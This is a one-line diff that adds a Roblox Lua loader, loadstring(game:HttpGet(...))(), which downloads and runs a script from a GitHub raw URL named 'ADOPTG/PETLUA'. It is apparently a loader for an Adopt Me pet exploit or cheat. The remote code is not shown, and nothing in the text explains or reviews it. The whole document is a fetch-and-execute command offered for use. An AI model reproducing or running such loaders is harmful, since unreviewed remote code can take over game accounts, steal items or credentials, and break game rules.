@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MunzGag/ADOPTG/refs/heads/main/PETLUA"))()
